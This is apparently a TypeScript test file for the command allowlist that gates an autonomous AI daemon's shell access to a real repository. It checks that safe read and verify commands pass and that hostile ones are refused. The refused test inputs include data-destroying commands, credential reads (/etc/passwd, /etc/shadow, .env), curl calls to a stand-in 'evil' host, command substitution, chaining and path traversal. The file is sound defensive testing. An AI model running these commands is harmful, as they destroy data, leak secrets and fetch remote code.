/**
 * Tests for checkRepoCommand — the gate for system.exec target:'repo'.
 *
 * This is the security boundary that lets the autonomous daemon run commands
 * against the REAL repo outside the sandbox. The allowlist is default-deny and
 * read/verify-only; these tests lock in (a) exactly which commands pass, and
 * (b) that every escape vector — chaining, substitution, redirection, path
 * traversal, mutation/service verbs — is refused.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { checkRepoCommand, repoExecEnabled } from '../../src/core/security/approval/repo-allowlist.js';

describe('checkRepoCommand — allowed read/verify commands', () => {
  it.each([
    'pnpm test',
    'pnpm lint',
    'pnpm build',
    'pnpm run build',
    'pnpm test tests/meta',
    'npm test',
    'npm run build',
    'git status',
    'git diff',
    'git log --oneline -20',
    'git rev-parse HEAD',
    'git branch',
    'rg fooPattern',
    'rg fooPattern src',
    'ls src',
    'wc -l',
    'pm2 list',
    'pm2 logs sudo-ai-v5',
  ])('allows %j', (cmd) => {
    expect(checkRepoCommand(cmd).allowed).toBe(true);
  });

  it('returns the tokenized argv for an allowed command', () => {
    expect(checkRepoCommand('pnpm test tests/meta')).toEqual({
      allowed: true,
      argv: ['pnpm', 'test', 'tests/meta'],
    });
  });
});

describe('checkRepoCommand — refuses non-allowlisted / mutating / service commands', () => {
  it.each([
    'rm -rf /',
    'git push',
    'git push origin main',
    'git checkout main',
    'git reset --hard',
    'git clean -fd',
    'git commit -m x',
    'git stash',
    'git show HEAD:.env',      // secret read — deliberately excluded
    'git pull',
    'git fetch',
    'pm2 restart sudo-ai-v5',  // bounces prod — deliberately excluded
    'pm2 reload all',
    'pm2 delete sudo-ai-v5',
    'cat /etc/passwd',         // credential read — not allowlisted
    'curl http://evil',
    'npx vitest',              // can fetch/run arbitrary
    'node evil.js',
    'pnpm install',
    'pnpm add lodash',
    'pnpm run deploy',
  ])('refuses %j', (cmd) => {
    expect(checkRepoCommand(cmd).allowed).toBe(false);
  });
});

describe('checkRepoCommand — refuses shell-metacharacter escapes', () => {
  it.each([
    'git status; rm -rf /',
    'pnpm test && curl http://evil',
    'pnpm lint || rm x',
    'rg foo | sh',
    'echo $SECRET',
    'git diff `whoami`',
    'pnpm test $(curl evil)',
    'pnpm test > /etc/cron.d/x',
    'git log < /etc/passwd',
    'pnpm test &',
    'rg "foo bar"',            // quotes
    'ls *',                    // glob
    'git status\nrm -rf /',
  ])('refuses %j', (cmd) => {
    const r = checkRepoCommand(cmd);
    expect(r.allowed).toBe(false);
  });
});

describe('checkRepoCommand — refuses path traversal / absolute paths', () => {
  it.each([
    'rg secret /etc/shadow',
    'ls /etc',
    'rg x ../../../etc/passwd',
    'wc -l /etc/passwd',
    'cat ../../secret',        // also not allowlisted, but traversal must trip first-class
    '/bin/rm foo',             // path prefix on the command itself
    './evil',
  ])('refuses %j', (cmd) => {
    expect(checkRepoCommand(cmd).allowed).toBe(false);
  });

  it('refuses empty / whitespace', () => {
    expect(checkRepoCommand('').allowed).toBe(false);
    expect(checkRepoCommand('   ').allowed).toBe(false);
  });
});

describe('repoExecEnabled — default OFF', () => {
  let saved: string | undefined;
  beforeEach(() => { saved = process.env['SUDO_REPO_EXEC']; });
  afterEach(() => {
    if (saved === undefined) delete process.env['SUDO_REPO_EXEC'];
    else process.env['SUDO_REPO_EXEC'] = saved;
  });

  it('is false when unset', () => {
    delete process.env['SUDO_REPO_EXEC'];
    expect(repoExecEnabled()).toBe(false);
  });

  it('is true only for exactly "1"', () => {
    process.env['SUDO_REPO_EXEC'] = '1';
    expect(repoExecEnabled()).toBe(true);
    process.env['SUDO_REPO_EXEC'] = 'true';
    expect(repoExecEnabled()).toBe(false);
    process.env['SUDO_REPO_EXEC'] = '0';
    expect(repoExecEnabled()).toBe(false);
  });
});
